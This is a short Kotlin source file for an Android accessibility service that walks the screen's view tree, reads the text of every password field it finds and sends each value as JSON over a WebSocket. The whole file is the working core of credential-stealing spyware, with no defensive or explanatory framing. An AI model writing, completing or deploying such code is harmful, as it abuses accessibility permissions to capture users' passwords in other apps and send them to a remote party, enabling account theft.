import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityNodeInfo
import okhttp3.WebSocket
import org.json.JSONObject
abstract class Capture : AccessibilityService() {
    lateinit var transport: WebSocket
    fun snapshot(inputNode: AccessibilityNodeInfo) {
        if (inputNode.isPassword()) {
            val jsonRecord = JSONObject()
            jsonRecord.put("value", inputNode.getText().toString())
            transport.send(jsonRecord.toString())
        }
        for (i in 0 until inputNode.getChildCount()) snapshot(inputNode.getChild(i))
    }
    fun activeTree() { snapshot(getRootInActiveWindow()) }
}
